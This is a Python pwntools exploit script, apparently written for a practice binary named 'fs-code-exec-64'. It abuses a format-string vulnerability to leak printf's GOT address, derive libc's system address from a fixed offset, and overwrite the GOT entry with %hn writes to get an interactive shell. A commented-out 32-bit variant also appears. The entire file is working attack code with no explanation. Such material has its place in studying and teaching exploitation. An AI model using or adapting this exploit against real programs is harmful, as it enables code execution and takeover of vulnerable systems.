#!/usr/bin/env python

from pwn import *

p = process('./fs-code-exec-64')

# arbitrary read -> read the GOT of printf

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)
got_of_printf = p.elf.got['printf']

print(p.recv())
#print(hex(got_of_printf))

p.sendline("%7$sAAAA" + p64(got_of_printf + 1))

print(p.recv(6))

data = p.recv(8)

libc_printf = u64(data)

libc_printf = libc_printf & 0xffffffffff

libc_printf = libc_printf << 8

print(hex(got_of_printf))
print(hex(libc_printf))

print(hex(u64(data)))

libc_system = libc_printf - 0x10470

print(hex(libc_system))

lower_16_system = libc_system & 0xffff

vfirst = lower_16_system
first = vfirst

vsecond = ((libc_system >> 16) & 0xffff)
second = vsecond - vfirst

while second < 0:
    second += 0x10000

vthird = ((libc_system >> 32) & 0xffff)
third = vthird - vsecond

while third < 0:
    third += 0x10000

print(hex(first))
print(hex(second))
print(hex(third))

buf = "%" + "%05d" % first + "x"
buf += "%11$hn"
buf += "%" + "%05d" % second + "x"
buf += "%12$hn"
buf += "%" + "%05d" % third + "x"
buf += "%13$hnA"
buf += p64(got_of_printf) + p64(got_of_printf + 2) + p64(got_of_printf + 4)

print(buf)

p.sendline(buf)

#p.sendline("%6228928x" + "%8$nAAA" + p64(got_of_printf))

#p.sendline("%2992x" + "%9$n" + "%-2913x" + "%10$nAA" + p64(got_of_printf) + p64(got_of_printf + 2))

"""
0x10470 = offset

libc_system = libc_printf - 0xf7e40670 + 0xf7e31da0

lower_16_system = libc_system & 0xffff

first = lower_16_system - 8

second = (libc_system >> 16) - lower_16_system

while second < 0:
        second += 0x10000

print(hex(libc_system))
print(hex(first))
print(hex(second))


buf = p32(got_of_printf) + p32(got_of_printf + 2)
buf += "%" + "%05d" % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"

p.sendline(buf)
"""
p.interactive()
